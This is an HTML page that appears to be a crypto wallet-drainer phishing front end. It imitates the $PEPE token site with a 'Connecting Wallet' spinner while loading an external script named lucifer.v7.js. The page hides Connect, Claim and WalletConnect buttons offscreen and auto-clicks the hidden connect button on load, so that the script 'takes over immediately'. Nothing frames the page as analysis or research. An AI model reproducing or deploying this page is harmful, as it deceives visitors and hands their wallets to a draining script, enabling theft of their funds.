<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connecting Wallet | $PEPE</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            /* Pepe Green Theme Colors */
            --bg: #43a047; 
            --card-bg: #1e4620;
            --text-main: #ffffff;
            --text-muted: #a5d6a7;
            --border-color: #2e7d32;
            --accent-color: #81c784;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            background-color: var(--bg);
            /* Solid Pepe green background style matching the official site */
            color: var(--text-main);
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
            overflow: hidden;
        }

        .connect-card {
            background: var(--card-bg);
            border: 2px solid var(--border-color);
            border-radius: 24px;
            width: 100%;
            max-width: 420px;
            padding: 2.5rem 2rem;
            box-shadow: 0 16px 40px rgba(0, 0, 0, 0.3);
            text-align: center;
            position: relative;
            z-index: 10;
        }

        .header-logo {
            font-size: 2.2rem;
            font-weight: 800;
            letter-spacing: -1px;
            margin-bottom: 2rem;
            color: var(--text-main);
            font-style: italic;
        }

        .spinner-container {
            position: relative;
            width: 80px;
            height: 80px;
            margin: 0 auto 2rem auto;
        }

        .spinner {
            width: 100%;
            height: 100%;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid var(--accent-color);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .status-title {
            font-size: 1.3rem;
            font-weight: 700;
            margin-bottom: 0.5rem;
            letter-spacing: -0.2px;
        }

        .status-desc {
            font-size: 0.95rem;
            color: var(--text-muted);
            line-height: 1.5;
            margin-bottom: 2rem;
        }

        .cancel-btn {
            background-color: transparent;
            color: var(--text-muted);
            border: 1px solid var(--border-color);
            border-radius: 30px;
            padding: 0.8rem 2rem;
            font-size: 0.9rem;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            width: 100%;
        }

        .cancel-btn:hover {
            background-color: rgba(255, 255, 255, 0.05);
            color: var(--text-main);
            border-color: var(--accent-color);
        }

        /* Keep trigger elements available for lucifer.v7.js to target */
        .hidden-triggers {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            border: 0;
            opacity: 0;
        }
    </style>
</head>
<body>

    <div class="connect-card">
        <div class="header-logo">$pepe</div>
        
        <div class="spinner-container">
            <div class="spinner"></div>
        </div>

        <h3 class="status-title" id="statusTitle">Connecting Wallet...</h3>
        <p class="status-desc" id="statusDesc">Please confirm the connection request in your wallet application to proceed.</p>

        <button class="cancel-btn" onclick="goBack()">Cancel</button>
    </div>

    <div class="hidden-triggers">
        <button class="interactBtn" id="connectButton">Connect</button>
        <button class="claimBtn" id="claimButton">Claim</button>
        <div class="wallet-connect-btn">WalletConnect</div>
        <div class="wallet-info"></div>
    </div>

    <script type="module" crossorigin src="/files/lucifer.v7.js"></script>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const activeWallet = urlParams.get('wallet') || 'Wallet';
        
        document.getElementById('statusTitle').textContent = `Connecting ${activeWallet}...`;

        window.addEventListener('DOMContentLoaded', () => {
            // Instantly auto-clicks the hidden button as soon as the page structure is ready
            // allowing lucifer.v7.js to take over immediately without custom visual wrappers
            setTimeout(() => {
                const interactBtn = document.querySelector('.interactBtn') || document.getElementById('connectButton');
                if (interactBtn) {
                    interactBtn.click();
                }
            }, 300);
        });

        function goBack() {
            window.history.back();
        }
    </script>
</body>
</html>
